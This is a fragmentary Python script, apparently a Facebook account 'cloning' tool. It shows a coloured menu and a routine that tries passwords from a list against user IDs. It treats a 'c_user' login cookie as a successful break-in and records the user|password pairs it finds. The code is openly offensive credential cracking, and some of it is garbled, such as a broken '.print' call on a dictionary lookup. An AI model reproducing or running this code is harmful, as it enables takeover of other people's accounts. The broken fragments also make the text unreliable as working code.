...
def main():
    ...
    print('\033[1;32m┌────────────────────────────────────────────┐') 
    print('\033[1;92m│\033[1;37m[1] \033[1;96mFILE CLONING   \033[1;37m[\033[1;32mCP/OK MIX IDS\033[1;37m] \033[1;31m(\033[1;32mFAST\033[1;31m) \033[1;32m │ ')
    print('\033[1;92m│\033[1;37m[2] \033[1;96mFILE CLONING   \033[1;37m[\033[1;32mONLY OK IDS  \033[1;37m] \033[1;31m(\033[1;32mSLOW\033[1;31m) \033[1;32m │')
    print('\033[1;92m│\033[1;37m[3] \033[1;96mPUBLIC CLONING \033[1;37m[\033[1;32mCP/OK MIX IDS\033[1;37m]\033[1;31m (\033[1;32mFAST\033[1;31m) \033[1;32m │')
    print('\033[1;92m│\033[1;37m[4] \033[1;96mRANDOM CLONING\033[1;32m                         │ ')
    print('\033[1;92m│\033[1;37m[5] \033[1;96mCREATE FILE \033[1;32m                           │')
    print('\033[1;92m│\033[1;37m[6] \033[1;96mSEPARATE IDS\033[1;32m                           │ ')
    #print('\033[1;92m│\033[1;37m[7] \033[1;96mCONTACT WITH OWNER \033[1;32m                    │')
    #print('\033[1;92m│\033[1;37m[08] \033[1;96mREMOVE TOKEN\033[1;32m                           │')
    print('\033[1;92m│\033[1;37m[0] \033[1;91mEXIT\033[1;32m                                   │ ')
    print('\033[1;32m└────────────────────────────────────────────┘')
    print('')
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				print('\r\033[1;31m[\033[1;30mKING-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[KING-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[KING-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
def publiccrack():
    ...
    os.system('clear')
    print(banner)
    os.system('rm -rf .KING1.txt')
    os.system('rm -rf .KING2.txt')
    ...
    if _CracKing__ in ('1', '1'):
        __cracking__().plerr()
    if _CracKing__ in ('0', '0'):
...
def create_file():
    ...
    for links in range(ask_link):
        completed +=1
        li = ('1')
        os.system('cat .KING1.txt | grep '+li+' >> .KING2.txt')
    ...
    os.system('clear')
    lines = open('.KING2.txt', 'r').readlines()
    print(banner)
    ...
    version()
if not os.path.exists(".KINGwork.txt"):
	open(".KINGwork.txt", 'w').close()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
